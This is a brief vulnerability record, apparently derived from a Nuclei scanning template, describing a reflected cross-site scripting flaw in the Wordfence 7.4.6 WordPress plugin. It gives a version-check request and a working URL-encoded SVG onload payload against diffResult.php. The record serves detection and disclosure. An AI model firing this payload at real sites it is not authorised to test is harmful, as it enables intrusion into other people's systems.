# Vulnerability: WordPress Wordfence 7.4.6 - Cross0Site Scripting
**Classification:** CWE-80
**Source:** Nuclei Template (`wordpress-wordfence-xss.yaml`)

## Description
WordPress Wordfence 7.4.6 is vulnerable to cross-site scripting.

## Vulnerable Code Pattern / Exploit Payload
```http
GET /wp-content/plugins/wordfence/readme.txt HTTP/1.1
Host: {{Hostname}}

GET {{BaseURL}}/wp-content/plugins/wordfence/lib/diffResult.php?file=%27%3E%22%3Csvg%2Fonload=confirm%28%27test%27%29%3E
```

